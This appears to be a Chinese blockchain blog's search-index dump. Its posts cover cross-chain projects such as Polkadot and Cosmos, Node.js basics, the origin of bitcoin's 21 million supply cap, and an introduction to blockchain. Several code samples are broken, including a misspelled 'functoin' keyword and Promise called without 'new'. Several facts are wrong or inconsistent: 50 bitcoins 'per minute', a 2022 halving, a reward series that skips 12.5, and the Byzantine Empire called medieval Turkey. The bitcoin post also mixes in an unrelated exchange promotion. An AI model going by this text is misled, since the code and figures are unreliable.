早期以Interledger与btc Relay为代表的跨链技术更多关注的是资产转移，现有跨链技术更关注跨链基础设施的落地，强调智能合约和去中心化，并接入各种跨链应用，侧重商业落地。目前跨链项目众多，最为大家所熟知的莫过于跨链双雄：Polkadot 和 Cosmos。 Polkadot是一种异构多链技术：主要由中继链、平行链和跨链桥组成。中继链相当于一个有很多插槽的插座，平行链就是各类家用电器，这些家电插上电，就能获得电力并运行。而平行链要与Polkadot之外的公链进行沟通的话就需要通过跨链桥来搭建在中继链上。 Cosmos是一个支持跨链交互的异构网络：它的目标是创建一个区块链互联网，允许大量自主且易开发的区块链互相扩展和交互。Cosmos的技术特点主要集中于三方面：一是Tendermint共识协议，属于拜占庭容错类的共识算法，在拜占庭节点数不超过 1/3的情况下，能够保证共识的安全性。二是Cosmos SDK，将共识算法和网络模块封装起来，形成一套开箱即用的区块链开发框架，开发者可以在其基础上快速定制开发适合自己需求的公链；三是IBC，也就是区块链间通信协议，它允许不同的区块链实现相互通信，也是Cosmos跨链的核心。 总结 随着区块链技术的不断发展与创新，大量区块链项目如雨后春笋般问世，万链共存是未来的趋势。跨链技术使不同领域不同功能链之间能够更好地实现互联互通与价值流动，同时还极大地降低了传输成本。当资产能够简单、安全的自由流通时，区块链生态将迎来大爆炸式增长。 ","date":"2020-02-26","objectID":"/blog/20200226/what-is-the-cross-chain-of-blockchain.html/:0:0","tags":["基础知识","区块链","跨链技术"],"title":"区块链“跨链”是什么？为什么要“跨链”？","uri":"/blog/20200226/what-is-the-cross-chain-of-blockchain.html/"},{"categories":null,"content":"专注于区块链智能合约开发和审计","date":"2019-08-02","objectID":"/blog/about/","tags":null,"title":"关于","uri":"/blog/about/"},{"categories":null,"content":"信息 专注于区块链智能合约开发和审计 ","date":"2019-08-02","objectID":"/blog/about/:1:0","tags":null,"title":"关于","uri":"/blog/about/"},{"categories":["基础知识"],"content":"1 基础语法 ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:0:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"1.1 定义变量 var 允许对同一个变量重新定义，覆盖原有值。 var a = 1; var a = 2; let 允许修改，但不允许重新定义 let b = 1; b = 2; const 初始化后不允许修改 const c = 100; ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:1:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"1.2 解构赋值 ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:2:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"1.2.1 数组的解构赋值 let arr = [0,1,2,3,4,5,6] let [a, b, c, d] = arr console.log(a, b, c) // 0 1 2 ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:2:1","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"1.2.2 对象的解构赋值 const person = { name: '5oneXj', age: 18 } let {name, age} = person console.log(name, age) // 5oneXj 18 // 如果自动推导需要同名，否则需要指定 let {name:name1, age:age1} = person console.log(name1, age1) // 5oneXj 18 ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:2:2","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"1.2.3 函数参数的解构赋值 const person = { name: '5oneXj’, age: 18 } function printPerson({name, age}){ console.log(`姓名：${name}，年龄：${age}`) } printPerson(person) // 姓名：5oneXj，年龄：18 ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:2:3","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"1.3 箭头函数 // 只适合用于普通函数 // 不要用在构造函数、不要用在成员函数、不要用在原型函数 let add = (a, b) =\u003e { return a + b } // 函数内一句可简写 let add = (a, b) =\u003e a + b console.log(add(1, 2)) // 3 ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:3:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"1.4 Class // `函数式语言，所以一切皆函数，所有对象都是从函数原型继承而来`。 class Person { constructor(name, age){ this.name = name; this.age = age } // 注意，函数没有function method(){ console.log('Person method') } } // 继承 class Man extends Person { constructor(name, age){ super(name, age) } // 重写父类方法 method(){ console.log('Override Person method') } } let p = new Person('5oneXj', 27) p.method() // Person method let m = new Man('sxj', 27) m.method() // Override Person method 2 进阶用法 ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:4:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"2.1 同步调用（阻塞） var fs = require(\"fs\") var data = fs.readFileSync(\"test.text\", 'utf-8') console.log( data.toString() ) ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:5:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"2.2 异步调用（非阻塞） var fs = require(\"fs\") fs.readFile(\"test.text\", 'utf-8', function (err, data){ if(err) return console.error(err); console.log( data.toString() ); }) ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:6:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"2.3 模块导入导出 // exports.js functoin say(){ return true; } functoin hear(){ return true; } // 导出单个 module.exports = say // 导出多个， 可以使用点函数，例如 test.say() module.exports = test = { say, hear } // 导出多个需要指定对应导出方法, let {say, hear} = require(‘./exports’) module.exports = { say, hear } let test = require(‘./exports’) test.say() test.hear() ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:7:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"2.4 path模块 let path = require('path') let p = '/Users/jollysone/Downloads/tracks.csv' path.basename(p) // 返回路径的最后一部分，tracks.csv path.dirname(p) // 返回路径的目录名，/Users/jollysone/Downloads/ path.extname(p) // 返回路径的后缀，.csv // 拼接路径，自动过滤多余斜线，最后一个不过滤，不知道是文件还是目录 path.join('/Users/jollysone/', '/Downloads/', 'tracks.csv/') // 将一个路径正常化 path.normalize('/Users//jollysone//Downloads//tracks.csv') // 基于当前node的执行目录与路径名字拼接 path.resolve('tracks.csv') // /home/tracks.csv ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:8:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"2.5 文件操作模块(同步异步) var fs = require('fs') // 同步读取 var data = fs.readFileSync(\"test.txt\", 'utf-8') // 异步读取 fs.readFile(\"test.txt\", 'utf-8', function (err, data){ if(err) return console.error(err); console.log( data.toString() ); }) // 同步写入 fs.writeFileSync(\"output.txt\", data.toString()) // 异步写入 fs.writeFile(\"output.txt\", data.toString(), (res) =\u003e { if(res){ console.log('异步写入失败！'); return } console.log('异步写入成功！'); }) // 同步读取文件的状态和信息，可以调取里面的成员变量信息 let stat = fs.statSync(\"output.txt\") console.log(stat.isFile); // 是否文件 console.log(stat.isDirectory); // 是否目录 // 同步删除文件 fs.unlinkSync(\"output.txt\") ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:9:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"2.6 Promise // 解决大量缩进的回调函数不易阅读的 callback hell 问题。 // 解决大量 异步调异步的嵌套。 new Promise(回调函数); // 异步读取文件封装成 Promise var fs = require('fs') let filePromise = new Promise(function (success, failed){ // 异步读取 fs.readFile(\"test.txt\", 'utf-8', function (err, data){ if(err){ failed(err); } // ... success(data); // 成功调用 }) }); filePromise.then(res =\u003e { console.log('data:', res); }).catch(err =\u003e { console.log(err); }) ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:10:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"2.7 async/await // 接上面 Promise // 直接将 Promise 异步代码变为同步写法，但是仍然是异步执行的。 async function demo(){ // 相当于 Promise.then 部分 try { let data = await filePromise } catch (e){ console.log(e); } } demo(); console.log('我是同步代码'); ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:11:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"2.8 Promise实际应用 // 将每个回调函数都封装成一个 Promise，然后用 async/await 将异步代码变为同步写法。 // 异步读取 Promise let readfilePromise = () =\u003e { return Promise((success, failed) =\u003e { fs.readFile(\"test.txt\", 'utf-8', function (err, data){ if(err){ failed(err); } success(data); }) }) } // 异步写入 Promise let writefilePromise = (data) =\u003e { return Promise((success, failed) =\u003e { fs.writeFile(\"test.txt\", data, function (err){ if(err){ failed(err); } success(‘异步写入成功’); }) }) } // 异步查询文件状态 Promise let statfilePromise = () =\u003e { return Promise((success, failed) =\u003e { fs.stat(\"test.txt\", function (err, stat){ if(err){ failed(err); } success(stat); }) }) } // 异步读取 =\u003e 异步写入 =\u003e 异步查询 let demo = async () =\u003e { try { let data = await readfilePromise(); let res = await writefilePromise(data); console.log('写入结果', res); let stat = await statfilePromise(); console.log('stat:', stat); } catch (e){ console.log(e); } } 3 NPM使用 # 装淘宝镜像使用 cnpm 命令 $ npm install cnpm $ npm i cnpm # 简写 # 在项目初始化生成 package.json 文件，npm 项目都有这个文件 $ npm init # 跳过向导，快速生成 package.json 文件 $ npm init -y # 安装指定依赖包 --save 参数安装同时会更新 package.json 文件中依赖项 # npm5 以后就不需要添加 $ npm install 包名 --save # 一次性安装 package.json 中的依赖项 $ npm install # 安装指定依赖包 $ npm install 包名 $ npm install —global 包名 $ npm install 包名 包名 包名 包名 $ npm install 包名@版本号 # 卸载指定依赖包 $ npm uninstall 包名 # 查看依赖包信息 $ npm view 包名 # 查看帮助 $ npm 命令 --help # 查看 npm 配置信息 $ npm config list # 设置镜像源 $ npm config set registry https://registry.npm.taobao.org # 清理缓存 $ npm cache clean --force ","date":"2018-03-31","objectID":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/:12:0","tags":["基础知识","Node.js"],"title":"区块链开发中必学的 Node.js 技术","uri":"/blog/20180331/node.js-technology-is-a-must-for-learning-blockchain.html/"},{"categories":["基础知识"],"content":"1 比特币发行量由什么决定？ 对于发行总量的粗略描述是这样的：每10分钟产生一定量的比特币，每四年减半，发行总量上限是2100万枚。 说说减半的规律，2009年1月比特币的创世区块诞生，所谓创世区块就是比特币区块链上的第0个区块，这个区块中生成的比特币数量是50个，10分钟之后系统上会出现下一个区块，生成的比特币数量依然是50个。比特币系统规定每四年比特币的产量会减半，也就是说从2009年开始，每分钟产生50个;四年之后，每10分钟产生25个;再过四年，每10分钟产生12.5个，到2140年所有的比特币将会被全部生产出来，总量是2100万。 上面就是对于比特币发行过程的粗略描述，所谓粗略，就是有些数据是不精确的，例如通过计算器就可以算出到2140年，实际发出的比特币总量是要略小于2100万的。 2 比特币2100万发行量由来 全文导读 根据区块链数据显示，币安交易所目前资产40.5亿美元，共有911个交易对，24小时成交额195.2亿美元，24小时内涨幅85.15%，在全球交易所综合排行榜中，币安交易所暂居第一位，同时币安交易所是国内三大交易所之一。 如果比特币要发展成为单一的世界货币(取代M1数字所包含的所有货币)，那么每个BTC的价值将为100万美元。因为每个比特币中有1亿个聪，所以每个聪的价值为0.01美元。 如果中本聪不是故意的，那么这些数字如此紧密地接近事实真是一个惊人的巧合。 比特币被中本聪设计上限为2100万个。通过限制其最大供应量，并减慢新比特币的出产出速度，中本聪希望每个比特币单位(目前称为“聪”)随着时间的推移而升值。 根据中本聪和比特币核心贡献者迈克·赫恩共享的一封电子邮件，中本聪认为，如果2100万个BTC被世界经济的某一部分使用，那么0.001 BTC的价值约为1欧元。 这个预测在2013年实现，当时比特币首次突破了1000欧元的价格点;如今，每个0.001个BTC的价值接近8.25欧元。 尽管中本聪在电子邮件中将比特币的价格与欧元进行了比较，但一些简单的数学运算表明他可能对比特币有更宏大的愿景，这样从侧面解释了为什么选择了上限为2100万的数字。 比特币诞生之时，全世界的货币供应量约为21万亿美元。这个数字被称为M1货币供应量，由世界上所有实物货币的总价值组成，包括现金、黄金、支票等等。 尽管M1货币供应量替代理论可能是中本聪选择2100万作为比特币上限的最合理的理由，但还有另一种(可能更简单)的解释。 查看用于控制比特币供应的参数，可以很清楚地看到2100万比特币的数字使网络能够确保在规则的时间段(10分钟)内开采区块。 它还可以确保，随着最大供应量接近其上限，作为出块奖励，支付给矿工的比特币数量会随着时间的流逝而减少。事实证明，中本聪为此设置的参数不可避免地导致最多只能生产2100万BTC。 比特币核心代码目前对挖掘难度做出了调整，以确保平均每10分钟挖掘一次新区块，而不管网络的哈希率是多少。基于此功能，每四年周期中应开采21万个区块，此后区块奖励将减半。 第一个周期看到每个区块产出了50个BTC;该数字在2012年减半至25BTC /区块，然后在2016年再次减至12.5BTC /区块。继2022年减半之后，目前位于6.25 / BTC区块。 如果向前推算，您会发现每个周期的块奖励总和等于100(50+25+6.25+3.125+1.5625+….依此类推)。通过将该数字乘以21万个块/周期图，您可以得出最大的2100万的最大供应量。 3 总结 通过以上介绍，相信大家对于比特币发行量由什么决定这个问题已经有所了解，其实对于投资者来说，在比特币交易过程中，最为重要的就是多了解，多学习，毕竟投资有风险，入市需谨慎，这句话大家都知道，举个例子，就好比开着船在大海里航行，没有人能零风险面对，左右不了市场行情的波动，只能增加舵手的能力和船的质量，那样行情的时候你的安全多一份保障，对应的面对的危险是不是少了一份。 ","date":"2018-03-06","objectID":"/blog/20180306/origin-of-bitcoins-21-million-circulation.html/:0:0","tags":["基础知识","比特币","BTC"],"title":"比特币发行量由什么决定？比特币2100万发行量由来？","uri":"/blog/20180306/origin-of-bitcoins-21-million-circulation.html/"},{"categories":["基础知识"],"content":"1 区块链的由来 区块链概念最早是从比特币衍生出来的。比特币（Bitcoin）诞生于2008年，是由一个名叫中本聪（Satoshi Nakamoto）的人首次提出，这个人非常神秘，至今没有他的任何准确信息。在提出后不久，比特币就诞生了。 比特币以及其他数字货币的核心技术称为区块链技术。区块链（Blockchain）在信息技术里是一种数据结构或数据存储方式。它创新性地组合了 密码技术、点对点（P2P）网络、分布式部署等技术，可以称其为一个划时代的理念。 2 区块链概念 区块链可以借由密码学，串接并保护内容的串联交易记录(又称区块)。在区块链中，区块内容具有 难以篡改 的特性，每一个区块都包含了 前一个区块的加密散列、相应时间戳 和 交易数据(通常用Hash树计算的散列值表示)。用区块链串接的分布式账本能让交易双方有效地记录交易，且可永久查验。 3 区块链原理 区块链技术可以认为是要解决互联网时代下的 “拜占庭将军问题”，即在网络中的中心节点和信息传递通道都缺乏可信度的情况下，如何使网络中的各个节点达成共识。 区块链技术在去中心化、各节点无须事先信任的情况下，通过加密算法、共识机制和特定的数据存储方式，构建一个集体维护的可靠的数据模式，实现数字资产在网络节点之间的转移。 拜占庭将军问题 拜占庭将军问题，首先是由Leslie Lamport与另外两人在1982年提出，故事的模型非常简单，却困扰了计算机科学家们数十年，可以说拜占庭将军问题是计算机分布式系统里的一个比较棘手的问题。 故事大概是这么说的：拜占庭帝国指的是中世纪的土耳其，拜占庭帝国拥有巨大的财富，周围有10个邻邦对拜占庭垂涎已久，但拜占庭高墙耸立，固若金汤，没有任何一个单独的邻邦能够成功入侵。任何单个邻邦入侵的都会失败，同时也有可能自身被其他9个邻邦同时入侵。拜占庭帝国防御能力如此之强，至少要有十个邻邦中的一半以上同时进攻，才有可能攻破。大家可能会想，这个还不简单，只要5个以上邻邦达成一致一起入侵，干掉拜占庭帝国岂不是很容易。然而，大家有没有想过一个问题，如果其中的一个或者几个邻邦本身答应好一起进攻，但实际过程出现背叛，那么其余入侵者都会被歼灭。于是每一方都小心行事，不敢轻易相信邻国。这就是拜占庭将军问题，在拜占庭问题里，各邻国最重要的事情是：所有将军如何能过达成共识去攻打拜占庭帝国。 达成共识并非坐下来开个会那么简单，有的将军心机深不可测，口是心非，如果有叛徒，可能会出现各种各样的问题，比如：叛徒可能欺骗某些将军自己将采取进攻行动，结果最后却没有行动。或者叛徒可能怂恿其他将军行动。再或者叛徒可能迷惑其他将军，使他们接受不一致的信息，从而让对方困惑到底要不要进攻，导致无法行动。科学家们做过深入的分析和研究，最后的结论是只要叛徒的数量大于等于1/3，那么任务就会失败。 那这个问题怎么解决呢，起初科学家提出了两种解决方案： 第一个方案是口头信息协议，也就是每个邻邦的将军们派人用口信传达消息，口头协议的算法很简单，如果其中一个邻邦发消息出去是进攻还上撤退，信息会传到所有其他邻邦，然后每个邻邦收到信息同样也是将信息传递给其余所有邻邦，每个邻邦都是信息的转达者，一轮下来，每个节点手上都会有10个信息（进攻或者撤退），有叛徒的话，那信息可能有进攻或者不进攻的不一致消息。每个人相当于手里有一本消息的账本，该到底怎么决策呢？如果有一半以上的人说进攻，那么采取进攻行动就是能成功的，所以这时即便有叛徒，只要听大部分人的，少数服从多数来行动就没什么大问题。但是这种口头协议的算法也存在明显的缺点，口头协议并不会告知消息的上一个来源是谁，也就是消息不可追根溯源，出现信息不一致也很难找到叛徒在哪里。 第二个方案是书面信息协议，既然上面说的消息无法追溯根源，那就用写信，信上还要带上将军的签名，比如每个国家都向其他所有国家写信，约定几月几日几点几分一起攻打拜占庭，收到信的国家如果同意就签字盖章，这些方式相比口头信息，消息都是有记录的，有了叛徒也能会找出来。但是在现实中也面临几个问题，首先中世纪的邻邦之间沟通只能靠信使骑马，将军们互不信任，也不可能亲自聚在一起开会，物理距离导致信息传输延迟。真正可信的签名体系难以实现。签名造假的问题也没法避免。签名消息记录的保存难以摆脱中心化的机构。另外，倘若每个国家都各自向其他9个国家派出信使，在这个网络层面即需要90次的传输才能完成一轮信息交流，但是每个国家可能回馈不同的进攻时间，在这种异步通信的条件下，要能协商一致是个大问题。 这就是一个由互不信任的各个邻邦国家所构成的分布式网络，要获得最大的利益，又必须一起努力才能完成，如何达成一致的共识，变成了一个难题。 首先，数据被按时间顺序划分成区块，每一个区块存放一段时间内的所有价值交换信息，所有节点存储这段时间内的数据，并且永久保存，各个节点通过特定的计算争夺领导权，将下一时间段的信息进行打包分发，并通过某种特定的信息添加到上一区块的后面，构成区块链结构。 这种区块链结构的特点就是可以保证数据的完整性，因为每一个区块都会存储它被创建之前的所有价值交换信息;还可以保证数据的严谨性，因为一旦新的区块被加入链中，之前的区块就再也不能修改。 区块链实现了从记录到传输再到存储的全面分布式的模式，数据传输、数据验证、数据存储都去中心化，所有参与者共同构建数据库。 区块链采用非对称加密算法以提高数据的可信赖度，非对称加密即指加密和解密使用不同的密码，即公钥和私钥。加密数据所用的密码被称为公钥，是所有人都知道的、可以用来给信息加密的密码;解密数据所用的密码被称为私钥，是只有 该信息的接收者知道并用于解密的密码。公钥加密的信息只有使用对应的私钥才可以解密。 实际情况中，假设甲向乙发送一个信息，甲、乙各自生产一对公钥与私钥用以加密和解密，甲、乙分别保管自己的私钥并向对方告知公钥，如果甲向乙发送信息，那么甲用乙的公钥进行加密并向乙发送加密后的信息，乙收到消息后用自己的私钥解密，网络中其他参与者均无法解密。这种算法强度高的加密方式保证了区块链信息的可信赖度。 区块链使用数学方法解决信任问题，用算法代替中心化的第三方机构，为人们创造信用，帮助人们达成共识。 4 区块链特点 区块链技术具有去中心化、信息不可篡改、信息透明和可共同维护等特点，下面将分别进行详细阐述。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:0:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"4.1 去中心化 去中心化就是指网络中各个节点的地位相等，传输内容和交易数据不再需要通过某个中心节点进行，数据也不再存储在中心节点上，这样可以防止因中心节点权力过大而引起的风险。区块链模式中，每个节点都存储数据交易中所有的价值交换数据，取代了中央计算机存储所有信息的模式。 另外，每个节点不仅会参与数据存储，还会验证其他节点记录信息的正确性。只有当某个记录的正确性被大部分节点认同，或者所有节点的对比结果一致时，它才可以被写入链中。 同时，为了保护数据信息不会因节点受攻击或其他意外而丢失，区块链会对所有数据进行分布式存储(将数据存储在网络中的每一个参与的节点中)，并实时更新，极大地提高了数据库的安全性。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:1:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"4.2 信息不可篡改 区块链网络中，每个参与节点都保存一份完整的交易历史记录，这样，任何一个节点想篡改这些历史记录，别的节点都可以拿出自己的数据备份进行证伪。所以，信息一旦被写入区块中，就不能更改、撤销了。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:2:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"4.3 信息透明 区块链中的项目和数据都是公开透明的。区块链项目组会公示项目信息和项目代码，区块中的数据经处理后被公开在区块链上，意味着所有的交易信息都是公开可见的。极短时间内，区块信息会被发送到网络中的所有节点上，实现全网数据同步，每个节点都能回溯交易双方过去的所有交易信息。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:3:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"4.4 可共同维护 在整个区块链系统中，无论是价值的提供者还是价值的接收者，都可以充当维护者，共同维护整个区块链信息的可靠性。 区块链系统是开放的，除了价值交易双方的私有信息被加密外，系统还由其中所有参与节点共同维护，任何一个节点都可以通过公开的接口查询区块链数据和开发相关应用，共同维护整个系统的信息透明度和可信赖性。 5 区块链技术体系 第一层：数据层，存储底层数据、非对称数据加密和时间戳等基础数据。 第二层：网络层，含有分布式组网机制、数据传播机制、数据验证机制等。 第三层：共识层，封装有各类共识机制算法，确定记账决定方式，这关系到整个系统的安全性和可靠性。目前较为知名的由共识层封装的共识机制有工作量证明机制(PoW，Proof of Work)、股份授权证明机制(DPoS，Delegated Proof of Stake)、权益证明机制(PoS，Proof of Stake)等。 第四层：激励层，在区块链技术体系中使用的经济手段，包括经济激励的发行以及分配，多出现在公有链中。 第五层：合约层，封装区块链系统中的脚本代码、算法以及智能合约，帮助区块链灵活地处理数据。 第六层：应用层，封装了各种应用场景和案例，如电商购物、新闻浏览、视频观看等。 6 区块链类型 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:4:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"6.1 公有区块链（公链） 公有区块链（Public Block Chains)：世界上任何个体或者团体都可以发送交易，且交易能够获得该区块链的有效确认，任何人都可以参与其共识过程。 公有区块链是最早的区块链，也是应用最广泛的区块链，各大bitcoins系列的虚拟数字货币均基于公有区块链，世界上有且仅有一条该币种对应的区块链。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:5:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"6.2 联合区块链（联盟链） 行业区块链（Consortium Block Chains)：由某个群体内部指定多个预选的节点为记账人，每个块的生成由所有的预选节点共同决定（预选节点参与共识过程），其他接入节点可以参与交易。 但不过问记账过程(本质上还是托管记账，只是变成分布式记账，预选节点的多少，如何决定每个块的记账者成为该区块链的主要风险点），其他任何人可以通过该区块链开放的API进行限定查询。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:6:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"6.3 私有区块链（私链） 私有区块链（Private Block Chains)：仅仅使用区块链的总账技术进行记账，可以是一个公司，也可以是个人，独享该区块链的写入权限，本链与其他的分布式存储方案没有太大区别。传统金融都是想实验尝试私有区块链，而公链的应用例如bitcoin已经工业化，私链的应用产品还在摸索当中。 7 区块链应用 区块链技术已经广泛应用于生活中各个领域，例如金融、医疗、内容社交平台、慈善、教育、版权保护、投票等。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:7:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"7.1 金融 区块链具有的信息透明、不可篡改的特点，在金融领域得到深入应用。各类金融资产如股权、债券、基金等都可以被融入区块链中，以“数字资产”的形式在区块链上进行存储和交易。跨境支付、数字货币、数字票据、支付清算、征信管理、证券交易和保险管理等方面也能从区块链技术中获益。 例如，传统的证券交易需要由证券公司、银行、中央结算机构以及交易所多方协同工作才能共同完成，导致效率低、成本高，容错率也很低，一个环节出现漏洞就会造成巨大的问题和损失。然而，在区块链技术应用在证券交易中后，各参与方便可独立地完成整个结算流程。 再比如，跨境支付是金融领域的重要组成部分，但效率低、速度慢。然而，在区块链点对点的技术应用到跨境支付领域后，汇款通道变得透明，交易历史数据可追溯，让收款方、汇款方都安心，也大大提高了效率和速度。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:8:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"7.2 医疗 区块链在医疗信息安全与隐私保护方面有着极其重要的应用。在当前中心化的信息管理系统下，各种黑客攻击和系统漏洞导致信息安全问题极大，而医疗领域存储着很多用户的私密资料，数据泄露问题一旦发生，就会造成极其严重的后果。因此，医疗领域需要森严的安全措施保护数据。 区块链的去中心化的特点则有针对性地解决了这个问题。去中心化的病人医疗健康信息数据存储与共享的建立大大有益于医疗行业。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:9:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"7.3 内容社交平台 目前，很多内容社交平台都是中心化的，如抖音、微博、微信公众号等，中心化的意思是中心决定节点，节点必须依赖中心，节点离开了中心就无法生存。因此，平台需要做的就是提供平台，然后用户通过平台为自己带来流量，进而利用流量获利。 区块链技术可以给内容社交平台注入新的血液，它利用分布式管理将平台去中心化，在新的去中心化系统中，每个人都是一个节点，任何人也都可以成为一个中心。这样平台可以将权力分散到用户身上，用户也可以贡献出自己的力量并获得平台的奖励和经济回报。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:10:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"7.4 慈善 人们捐赠爱心、传递善意是一件美好而伟大的事，但是层出不穷的慈善黑幕事件给这件美好的事情增添了污点。慈善体系的不透明为这类事情提供了契机，也引发捐赠者对这个行业的担忧。 区块链技术可以大大提高慈善领域的信息透明度，让捐赠者有权对慈善体系和流程进行监督，进而鼓励捐赠者放心捐助，形成良性循环，改善慈善事业。 如利用区块链技术建立公开透明的、不可篡改的信息体系，从善款的流向到受捐赠者的身份确认，建立慈善领域的监督问责机制，增加捐赠者对机构的信任和信心，同时也保护了捐赠方和受赠方的隐私。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:11:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"7.5 教育 教育系统中，学历认证一直十分重要，人工验证纸质版证书的效率低下，且纸质版证书有丢失的风险。区块链由所有参与者进行维护且不可篡改，使用区块链存储和保护学生的证明文件，可以简化流程并提高学历认证的效率。 学生的学历信息和档案记录等全部存储在区块链中，当学生需要证明自己学历和相关信息时，只需让对方加入链并看见自己的文件即可。同时，区块链具有去中心化的特点，证书不会因为中心机构关闭而消失，数据永远存在。 